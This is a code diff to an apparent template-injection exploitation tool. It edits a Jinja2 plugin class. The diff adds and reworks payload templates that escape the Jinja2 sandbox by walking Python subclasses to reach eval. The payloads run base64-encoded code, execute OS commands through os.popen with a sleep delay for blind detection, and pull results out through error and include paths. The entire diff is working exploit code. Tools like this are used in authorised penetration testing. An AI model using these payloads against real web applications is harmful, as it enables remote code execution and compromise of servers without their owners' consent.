@@ -28,23 +28,36 @@ class Jinja2_old(python.Python):
                 'test_render': f'{{{{({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e}}}}',
                 'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': '{{%set h=({header[0]}+{header[1]})|string%}}',
+                'trailer': '{{%set t=({trailer[0]}+{trailer[1]})|string%}}{{%include [h,b,t]|join%}}',
+                'test_render': f'{{%set b=(({rand.randints[0]},{rand.randints[1]}*{rand.randints[2]})|e)|string%}}',
+                'test_render_expected': f'{(rand.randints[0],rand.randints[1]*rand.randints[2])}'
+            },
             'evaluate': {
                 'call': 'render',
-                'evaluate': """{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}\
-{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}\
-{{% if 'eval' in b.keys() %}}\
-{{{{ b['eval'](d) }}}}\
-{{% endif %}} {{% endif %}} {{% endfor %}}\
-{{% endif %}} {{% endfor %}}"""
+                'evaluate': """{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}\
+{{% for c in [].__class__.__base__.__subclasses__() %}}{{% if c.__name__ == 'catch_warnings' %}}\
+{{% for b in c.__init__.__globals__.values() %}}{{% if b.__class__ == {{}}.__class__ %}}\
+{{% if 'eval' in b.keys() %}}{{{{ b['eval'](d) }}}}\
+{{% endif %}}{{% endif %}}{{% endfor %}}{{% endif %}}{{% endfor %}}"""
+            },
+            'evaluate_error': {
+                'call': 'render',
+                'evaluate': """{{% set l = [] %}}{{% set d = "eval(__import__('base64').urlsafe_b64decode('{code_b64}'))" %}}\
+{{% for c in [].__class__.__base__.__subclasses__() %}}{{% if c.__name__ == 'catch_warnings' %}}\
+{{% for bb in c.__init__.__globals__.values() %}}{{% if bb.__class__ == {{}}.__class__ %}}\
+{{% if 'eval' in bb.keys() %}}{{{{l.append(bb['eval'](d))}}}}\
+{{% endif %}}{{% endif %}}{{% endfor %}}{{% endif %}}{{% endfor %}}{{%set b=l[0]%}}"""
             },
             'execute_blind': {
                 'call': 'inject',
-                'execute_blind': """{{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()" %}}{{% for c in [].__class__.__base__.__subclasses__() %}} {{% if c.__name__ == 'catch_warnings' %}}\
-{{% for b in c.__init__.__globals__.values() %}} {{% if b.__class__ == {{}}.__class__ %}}\
-{{% if 'eval' in b.keys() %}}\
-{{{{ b['eval'](d) }}}}\
-{{% endif %}} {{% endif %}} {{% endfor %}}\
-{{% endif %}} {{% endfor %}}"""
+                'execute_blind': """{{% set d = "__import__('os').popen(__import__('base64').urlsafe_b64decode('{code_b64}').decode() + ' && sleep {delay}').read()" %}}\
+{{% for c in [].__class__.__base__.__subclasses__() %}}{{% if c.__name__ == 'catch_warnings' %}}\
+{{% for b in c.__init__.__globals__.values() %}}{{% if b.__class__ == {{}}.__class__ %}}\
+{{% if 'eval' in b.keys() %}}{{{{ b['eval'](d) }}}}\
+{{% endif %}}{{% endif %}}{{% endfor %}}{{% endif %}}{{% endfor %}}"""
             },
         })
 
